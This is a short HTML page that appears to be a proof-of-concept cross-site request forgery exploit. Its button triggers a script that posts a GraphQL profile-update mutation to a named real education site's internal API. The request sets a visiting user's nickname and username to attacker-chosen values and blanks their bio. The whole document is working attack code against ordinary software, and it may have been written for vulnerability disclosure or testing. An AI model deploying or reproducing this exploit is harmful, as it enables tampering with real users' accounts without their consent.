<!DOCTYPE html>
<html>
<body>
    <h1>Click the button to perform a CSRF attack!</h1>

    <button id="csrfButton">Click to Update Profile</button>

    <script>
        document.getElementById('csrfButton').addEventListener('click', function() {
            const data = {
                operationName: "updateProfile",
                variables: {
                    bio: "",
                    nickname: "AttackerNickname",
                    username: "AttackerUsername"
                },
                query: `mutation updateProfile($avatarName: String, $bio: String, $profileAccessLevel: ProfileAccessLevel, $nickname: String, $username: String) {
                  setSettings(
                    avatarName: $avatarName
                    bio: $bio
                    nickname: $nickname
                    username: $username
                    profileAccessLevel: $profileAccessLevel
                  ) {
                    user {
                      id
                      avatar {
                        name
                        imageSrc
                        __typename
                      }
                      bio
                      profile {
                        accessLevel
                        __typename
                      }
                      nickname
                      username
                      __typename
                    }
                    errors {
                      code
                      __typename
                    }
                    __typename
                  }
                }`
            };

            fetch('https://www.khanacademy.org/api/internal/graphql/updateProfile?lang=en&_=240807-1626-6591bfdb76a6_1723107484284', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => response.json())
              .then(data => console.log('Success:', data))
              .catch((error) => console.error('Error:', error));
        });
    </script>
</body>
</html>
